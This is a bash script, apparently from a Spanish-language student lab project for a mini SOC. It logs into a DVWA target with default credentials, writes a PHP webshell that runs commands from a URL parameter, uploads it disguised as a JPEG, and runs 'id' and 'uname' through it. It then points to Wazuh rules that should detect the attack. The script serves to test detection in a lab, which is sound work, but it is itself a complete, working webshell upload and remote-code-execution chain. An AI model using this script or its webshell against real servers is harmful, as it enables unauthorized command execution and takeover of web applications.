#!/usr/bin/env bash
# =============================================================================
# Proyecto 2 - Mini SOC TiendaCR - Ataque 4: Webshell + RCE
# Ejecutar SOLO desde Kali contra el laboratorio propio. MITRE ATT&CK T1505.003
# =============================================================================
TARGET="${TARGET:-192.168.56.10}"; CJ=/tmp/dvwa-cookies.txt
SH="ws-$(date +%H%M%S).php"
echo "[1/4] Login en DVWA (nivel low)..."
TOKEN=$(curl -s -c "$CJ" "http://$TARGET/login.php" | grep -oP "user_token' value='\K[^']+")
curl -s -b "$CJ" -c "$CJ" -d "username=admin&password=password&Login=Login&user_token=$TOKEN" "http://$TARGET/login.php" -o /dev/null
echo "[2/4] Creando webshell local: $SH"
printf '%s\n' '<?php echo "WEBSHELL-TIENDACR:"; system($_GET["cmd"]); ?>' > "/tmp/$SH"
echo "[3/4] Subiendo webshell (modulo File Upload)..."
UTOK=$(curl -s -b "$CJ" -b "security=low" "http://$TARGET/vulnerabilities/upload/" | grep -oP "user_token' value='\K[^']+")
curl -s -b "$CJ" -b "security=low" -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/$SH;type=image/jpeg" \
  -F "Upload=Upload" -F "user_token=$UTOK" "http://$TARGET/vulnerabilities/upload/" \
  | grep -oiE 'succe[s]+fully uploaded|hackable/uploads/[^< ]+' | head -2
echo "[4/4] Ejecutando la webshell (RCE):"
echo -n "   cmd=id    -> "; curl -s "http://$TARGET/hackable/uploads/$SH?cmd=id"; echo
echo -n "   cmd=uname -> "; curl -s "http://$TARGET/hackable/uploads/$SH?cmd=uname%20-a"; echo
echo "Verificar en Wazuh: rule.id:(100110 or 100120)"
